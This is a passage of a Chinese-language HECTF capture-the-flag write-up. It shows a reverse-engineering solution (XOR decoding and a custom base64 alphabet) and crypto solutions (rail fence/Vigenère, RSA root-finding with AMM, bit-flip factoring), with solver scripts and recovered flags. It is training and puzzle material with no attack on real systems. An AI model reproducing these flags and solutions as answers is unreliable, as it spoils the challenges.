class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + ((<span class=\"number\">4</span> * <span class=\"built_in\">BYTE2</span>(v12)) &amp; <span class=\"number\">0x3C</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, <span class=\"string\">&quot;=&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  std::string::<span class=\"keyword\">operator</span>=(a2, v11);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v15 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里就是典型的算法识别，实现的是一个 base64 加密，再就是这个函数，对 v6 进行了处理（我们输入的 flag 就是这个）：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title\">sub_13A9</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> v2; <span class=\"comment\">// bl</span></span><br><span class=\"line\">  <span class=\"type\">char</span> v3; <span class=\"comment\">// bl</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-38h] BYREF</span></span><br><span class=\"line\">  __int64 v6; <span class=\"comment\">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 i; <span class=\"comment\">// [rsp+28h] [rbp-28h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v8; <span class=\"comment\">// [rsp+30h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v9; <span class=\"comment\">// [rsp+38h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v9 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v6 = std::string::<span class=\"built_in\">length</span>(a2);</span><br><span class=\"line\">  v5 = std::string::<span class=\"built_in\">length</span>(a1);</span><br><span class=\"line\">  v8 = *(_QWORD *)<span class=\"built_in\">sub_1DC2</span>(&amp;v5, &amp;v6);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0LL</span>; i &lt; v8; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v2 = *(_BYTE *)std::string::<span class=\"keyword\">operator</span>[](a1, i);</span><br><span class=\"line\">    v3 = *(_BYTE *)std::string::<span class=\"keyword\">operator</span>[](a2, i) ^ v2;</span><br><span class=\"line\">    *(_BYTE *)std::string::<span class=\"keyword\">operator</span>[](a1, i) = v3;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v9 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t不过这个函数显而易见是用来干扰人的，这里对字符串异或之后存放的是第一个字符串地址，但 flag 是第二个参数，所以程序分析完了，其他的都不咋有用了，之后就是直接找数据，在最后那个异或函数里面存在一个数组 dword_4020 [j]，没有在函数中定义过，所以直接推测在全局变量里，双击跟进找到了，在 bss 段上：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.data:0000000000004020 ; _DWORD dword_4020[64]</span><br><span class=\"line\">.data:0000000000004020 dword_4020      dd 81, 67, 84, 67, 85, 66, 90, 118, 79, 70, 72, 115, 92</span><br><span class=\"line\">.data:0000000000004020                                         ; DATA XREF: sub_17A7+F8↑o</span><br><span class=\"line\">.data:0000000000004054                 dd 70, 125, 107, 78, 80, 85, 104, 81, 85, 125, 62, 69</span><br><span class=\"line\">.data:0000000000004084                 dd 93, 67, 103, 69, 62, 59, 61, 71, 73, 83, 32, 84, 89</span><br><span class=\"line\">.data:00000000000040B8                 dd 67, 96, 64, 95, 73, 126, 69, 56, 117, 56, 71, 124, 37</span><br><span class=\"line\">.data:00000000000040EC                 dd 41, 90, 125, 89, 99, 95, 70, 87, 56, 95, 66, 121, 40</span><br></pre></td></tr></table></figure>\n<p>​\t\t提取数据，然后写个脚本，根据异或算法写：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v5; ++i )</span><br><span class=\"line\">  v6[i] = *(<span class=\"type\">char</span> *)std::string::<span class=\"keyword\">operator</span>[](a1, i) ^ (i / <span class=\"number\">3</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t\texp 为：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">compare</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flag[])</span></span>;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> target[] = &#123;<span class=\"number\">81</span>,<span class=\"number\">67</span>,<span class=\"number\">84</span>,<span class=\"number\">67</span>,<span class=\"number\">85</span>,<span class=\"number\">66</span>,<span class=\"number\">90</span>,<span class=\"number\">118</span>,<span class=\"number\">79</span>,<span class=\"number\">70</span>,<span class=\"number\">72</span>,<span class=\"number\">115</span>,<span class=\"number\">92</span>,<span class=\"number\">70</span>,<span class=\"number\">125</span>,<span class=\"number\">107</span>,<span class=\"number\">78</span>,<span class=\"number\">80</span>,<span class=\"number\">85</span>,<span class=\"number\">104</span>,<span class=\"number\">81</span>,<span class=\"number\">85</span>,<span class=\"number\">125</span>,<span class=\"number\">62</span>,<span class=\"number\">69</span>,<span class=\"number\">93</span>,<span class=\"number\">67</span>,<span class=\"number\">103</span>,<span class=\"number\">69</span>,<span class=\"number\">62</span>,<span class=\"number\">59</span>,<span class=\"number\">61</span>,<span class=\"number\">71</span>,<span class=\"number\">73</span>,<span class=\"number\">83</span>,<span class=\"number\">32</span>,<span class=\"number\">84</span>,<span class=\"number\">89</span>,<span class=\"number\">67</span>,<span class=\"number\">96</span>,<span class=\"number\">64</span>,<span class=\"number\">95</span>,<span class=\"number\">73</span>,<span class=\"number\">126</span>,<span class=\"number\">69</span>,<span class=\"number\">56</span>,<span class=\"number\">117</span>,<span class=\"number\">56</span>,<span class=\"number\">71</span>,<span class=\"number\">124</span>,<span class=\"number\">37</span>,<span class=\"number\">41</span>,<span class=\"number\">90</span>,<span class=\"number\">125</span>,<span class=\"number\">89</span>,<span class=\"number\">99</span>,<span class=\"number\">95</span>,<span class=\"number\">70</span>,<span class=\"number\">87</span>,<span class=\"number\">56</span>,<span class=\"number\">95</span>,<span class=\"number\">66</span>,<span class=\"number\">121</span>,<span class=\"number\">40</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">compare</span>(target);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">compare</span><span class=\"params\">(<span class=\"type\">unsigned</span> <span class=\"type\">int</span> flag[])</span></span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> len = <span class=\"number\">64</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span> f[<span class=\"number\">100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; len; ++i)&#123;</span><br><span class=\"line\">        f[i] = flag[i] ^ i / <span class=\"number\">3</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>;i &lt; len; ++i )&#123;</span><br><span class=\"line\">        std::cout &lt;&lt; f[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm=</span></span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就是 base64 解密，不过这里出现了问题，base64 直接解密后发现有不可显示字符，并且再在之前没有任何关于操作 flag 的内容，并且 flag 应该是全是可显示的 <code>HECTF&#123;&#125;</code>  包起来的，所以应该是 base64 变表，找表。</p>\n<p>​\t\t在之前的 base64 加密的那个函数里有个数组 <code>dword_2040[i]</code> ，跟进看看：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:0000000000002040 ; _DWORD dword_2040[64]</span><br><span class=\"line\">.rodata:0000000000002040 dword_2040      dd 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75</span><br><span class=\"line\">.rodata:0000000000002040                                         ; DATA XREF: sub_1920+7F↑o</span><br><span class=\"line\">.rodata:0000000000002074                 dd 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88</span><br><span class=\"line\">.rodata:00000000000020A8                 dd 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 43</span><br><span class=\"line\">.rodata:00000000000020DC                 dd 47, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107</span><br><span class=\"line\">.rodata:000000000000210C                 dd 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118</span><br><span class=\"line\">.rodata:0000000000002138                 dd 119, 120</span><br></pre></td></tr></table></figure>\n<p>​\t\t提取出来输出出来是：yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx</p>\n<p>​\t\t所以，这个就是变了之后的表，拿着这个去解密，成功得到 flag：</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto：</h2>\n<h3 id=\"迷茫的艾米莉\"><a class=\"markdownIt-Anchor\" href=\"#迷茫的艾米莉\">#</a> 迷茫的艾米莉</h3>\n<p>Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr</p>\n<p>key:  6</p>\n<p P0fo2bb51lbbmew_0f_rczav9_jv=\"\">YIUIT</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jeWJlcmNoZWYub3JnLyNyZWNpcGU9UmFpbF9GZW5jZV9DaXBoZXJfRW5jb2RlKDYsMC9kaXNhYmxlZClSYWlsX0ZlbmNlX0NpcGhlcl9EZWNvZGUoNiwwKQ==\">Rail Fence Cipher Encode, 1 more - CyberChef</span></p>\n<p>key:  responsibility</p>\n<p C0ng2at51ations_0n_comin9_in=\"\">HECTF</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucXF4aXV6aS5jbi9iaWFubWEvd2VpamluaXlhbWltYS5waHA=\">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</span></p>\n<h3 id=\"seven-more\"><a class=\"markdownIt-Anchor\" href=\"#seven-more\">#</a> seven more</h3>\n<p>e 和 phi 不互素的情况下和欧拉值也不互素 甚至现在 e 和 q 也不互素了</p>\n<p>与传统 amm 不同的是 还要求出所有的 mq7</p>\n<p>以下是解密脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">import</span> math</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n = <span class=\"number\">211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201</span></span><br><span class=\"line\">c = <span class=\"number\">191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066</span></span><br><span class=\"line\">e = <span class=\"number\">1009</span>*<span class=\"number\">7</span></span><br><span class=\"line\">p = <span class=\"number\">31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223</span></span><br><span class=\"line\">q = <span class=\"number\">6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">onemod</span>(<span class=\"params\">e, q</span>):</span><br><span class=\"line\">    p = random.randint(<span class=\"number\">1</span>, q-<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(powmod(p, (q-<span class=\"number\">1</span>)//e, q) == <span class=\"number\">1</span>):  <span class=\"comment\"># (r,s)=1</span></span><br><span class=\"line\">        p = random.randint(<span class=\"number\">1</span>, q)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">AMM_rth</span>(<span class=\"params\">o, r, q</span>):  <span class=\"comment\"># r|(q-1</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span>((q-<span class=\"number\">1</span>) % r == <span class=\"number\">0</span>)</span><br><span class=\"line\">    p = onemod(r, q)</span><br><span class=\"line\"></span><br><span class=\"line\">    t = <span class=\"number\">0</span></span><br><span class=\"line\">    s = q-<span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>(s % r == <span class=\"number\">0</span>):</span><br><span class=\"line\">        s = s//r</span><br><span class=\"line\">        t += <span class=\"number\">1</span></span><br><span class=\"line\">    k = <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span>((s*k+<span class=\"number\">1</span>) % r != <span class=\"number\">0</span>):</span><br><span class=\"line\">        k += <span class=\"number\">1</span></span><br><span class=\"line\">    alp = (s*k+<span class=\"number\">1</span>)//r</span><br><span class=\"line\"></span><br><span class=\"line\">    a = powmod(p, r**(t-<span class=\"number\">1</span>)*s, q)</span><br><span class=\"line\">    b = powmod(o, r*a-<span class=\"number\">1</span>, q)</span><br><span class=\"line\">    c = powmod(p, s, q)</span><br><span class=\"line\">    h = <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, t-<span class=\"number\">1</span>):</span><br><span class=\"line\">        d = powmod(<span class=\"built_in\">int</span>(b), r**(t-<span class=\"number\">1</span>-i), q)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> d == <span class=\"number\">1</span>:</span><br><span class=\"line\">            j = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            j = (-math.log(d, a)) % r</span><br><span class=\"line\">        b = (b*(c**(r*j))) % q</span><br><span class=\"line\">        h = (h*c**j) % q</span><br><span class=\"line\">        c = (c*r) % q</span><br><span class=\"line\">    result = (powmod(o, alp, q)*h)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">AMM_Solution</span>(<span class=\"params\">m, q, rt, cq, e</span>):</span><br><span class=\"line\">    mp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> pr <span class=\"keyword\">in</span> rt:</span><br><span class=\"line\">        r = (pr*m) % q</span><br><span class=\"line\">        <span class=\"comment\"># assert(pow(r, e, q) == cq)</span></span><br><span class=\"line\">        mp.append(r)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> mp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check</span>(<span class=\"params\">m</span>):</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        a = long_to_bytes(m)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&#x27;HECTF&#x27;</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(a)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">CHECK2</span>(<span class=\"params\">mp, mq, e, p, q</span>):</span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    j = <span class=\"number\">1</span></span><br><span class=\"line\">    t1 = invert(q, p)</span><br><span class=\"line\">    t2 = invert(p, q)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> mp1 <span class=\"keyword\">in</span> mp:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> mq1 <span class=\"keyword\">in</span> mq:</span><br><span class=\"line\">            j += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> j % <span class=\"number\">100000</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(j)</span><br><span class=\"line\">            ans = (mp1*t1*q+mq1*t2*p) % (p*q)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> check(ans):</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">AMM_ROOT</span>(<span class=\"params\">r, q</span>):</span><br><span class=\"line\">    li = <span class=\"built_in\">set</span>()</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"built_in\">len</span>(li) &lt; r):</span><br><span class=\"line\">        p = powmod(random.randint(<span class=\"number\">1</span>, q-<span class=\"number\">1</span>), (q-<span class=\"number\">1</span>)//r, q)</span><br><span class=\"line\">        li.add(p)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> li</span><br><span class=\"line\"></span><br><span class=\"line\">cp = c % p</span><br><span class=\"line\">cq = c % q</span><br><span class=\"line\"></span><br><span class=\"line\">mp = AMM_rth(cp, e, p)</span><br><span class=\"line\">mq = AMM_rth(cq, <span class=\"number\">1009</span>, q)</span><br><span class=\"line\"></span><br><span class=\"line\">rt1 = AMM_ROOT(e, p)</span><br><span class=\"line\">rt2 = AMM_ROOT(<span class=\"number\">1009</span>, q)</span><br><span class=\"line\"></span><br><span class=\"line\">ammp = AMM_Solution(mp, p, rt1, cp, e)</span><br><span class=\"line\">ammq = AMM_Solution(mq, q, rt2, cq, <span class=\"number\">1009</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">d = invert(<span class=\"number\">7</span>, q-<span class=\"number\">1</span>)</span><br><span class=\"line\">mqs = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> mq <span class=\"keyword\">in</span> ammq:</span><br><span class=\"line\">    mqs.append(<span class=\"built_in\">pow</span>(mq, d, q))</span><br><span class=\"line\">ammq = mqs</span><br><span class=\"line\">CHECK2(ammp, ammq, e, p, q)</span><br><span class=\"line\"><span class=\"comment\">##HECTF&#123;go0d_jOb_At_AmM&#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"翻一翻\"><a class=\"markdownIt-Anchor\" href=\"#翻一翻\">#</a> 翻一翻：</h3>\n<p>爆破思路类似 RSA parity oracle。p,q 是 bit 翻转关系， 已知 p 最低的 k 位，则已知 q</p>\n<p>最高的 k 位。假设已知 k 位的 p,q ，记为 ph,qh，利用不等式</p>\n<p>ph ·qh.21024-2k &lt;=n&lt;(ph+1) ·(qh+ 1).21024-2k</p>\n<p>逐位向低地址爆破，不断收缩不等式的范围，最终可求得 p，q 的值</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"number\">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">t</span>(<span class=\"params\">a, b, k</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> k == <span class=\"number\">77</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> a*b == n:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(a, b)</span><br><span class=\"line\">        <span class=\"keyword\">return</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">            a1 = a + i*(<span class=\"number\">10</span>**k) + j*(<span class=\"number\">10</span>**(<span class=\"number\">154</span>-k))</span><br><span class=\"line\">            b1 = b + j*(<span class=\"number\">10</span>**k) + i*(<span class=\"number\">10</span>**(<span class=\"number\">154</span>-k))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> a1*b1 &gt; n:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (a1+(<span class=\"number\">10</span>**(<span class=\"number\">154</span>-k)))*(b1+(<span class=\"number\">10</span>**(<span class=\"number\">154</span>-k))) &lt; n:</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((a1*b1)%(<span class=\"number\">10</span>**(k+<span class=\"number\">1</span>))) != (n%(<span class=\"number\">10</span>**(k+<span class=\"number\">1</span>))):</span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\">            t(a1, b1, k+<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    t(i*(<span class=\"number\">10</span>**<span class=\"number\">77</span>), i*(<span class=\"number\">10</span>**<span class=\"number\">77</span>), <span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 